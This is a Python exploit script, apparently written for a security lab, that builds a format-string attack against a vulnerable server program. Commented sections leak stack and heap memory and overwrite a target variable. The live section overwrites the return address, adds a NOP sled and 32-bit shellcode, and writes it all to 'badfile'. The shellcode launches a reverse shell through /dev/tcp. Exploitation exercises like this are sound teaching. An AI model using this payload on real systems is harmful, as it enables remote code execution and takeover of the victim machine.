#!/usr/bin/python3
import sys

N = 1500

buffer_addr = 0xffffd4b0
jmp_len     = 0x100
secret_addr = 0x56557008
target_addr = 0x56559028
ret_ip_addr = 0xffffd348 + 0x4

# Task1: Crashing the Program
# s = "%n" * 30 + "\n"
# payload = s.encode('latin1')

# Task2: Printing Out the Server Program’s Memory
#     A: Stack Data
# payload = ('@@@@').encode('latin1')
# s = "%.8x|" * 120 + "\n"
# payload += s.encode('latin1')
#     B: Heap Data
# payload = secret_addr.to_bytes(4, byteorder='little')
# # s = "%.8x|" * 99 + "%s\n"
# s = "%100$s\n"
# payload += s.encode('latin1')

# Task3: Modifying the Server Program’s Memory
# payload = (target_addr + 2).to_bytes(4, byteorder='little') + \
#           ("@@@@").encode('latin-1') + \
#           (target_addr).to_bytes(4, byteorder='little')
# offset1  = 0xc0ff - len(payload)
# offset2  = 0xee00 - 0xc0ff
# s = "%." + str(offset1) + "x" + "%100$hn" + \
#     "%." + str(offset2) + "x" + "%102$hn" + "\n"
# payload += s.encode('latin-1')

# Task 4: Inject Malicious Code into the Server Program
shellcode_32 = (
    "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
    "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
    "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
    "/bin/bash*"
    "-c*"
    # "/bin/ls -l; echo '===== Success! ======'                  *"   # should be 59 chars
    "/bin/bash -i > /dev/tcp/0.0.0.0/11803 0<&1 2>&1           *"
    "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
    "BBBB"   # Placeholder for argv[1] --> "-c"
    "CCCC"   # Placeholder for argv[2] --> the command string
    "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# The address to be modified
payload = (ret_ip_addr + 2).to_bytes(4, byteorder='little') + \
          ("@@@@").encode('latin-1') + \
          (ret_ip_addr).to_bytes(4, byteorder='little')

# The format string to modify the memory
high = ((buffer_addr + jmp_len) & 0xffff0000) >> 16
low  = (buffer_addr + jmp_len) & 0xffff
offset1 = high - len(payload)
offset2 = (low | 0x10000) - high if high >= low else low - high
fmt_str = "%." + str(offset1) + "x" + "%100$hn" + \
          "%." + str(offset2) + "x" + "%102$hn"
payload += (fmt_str).encode('latin-1')
assert len(payload) < jmp_len <= N - len(shellcode_32), "Wrong jmp_len: %d!" % jmp_len

# The slide code(NOPS) and shellcode
payload += bytearray(0x90 for _ in range(N - len(payload) - len(shellcode_32)))
payload += shellcode_32

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(payload)
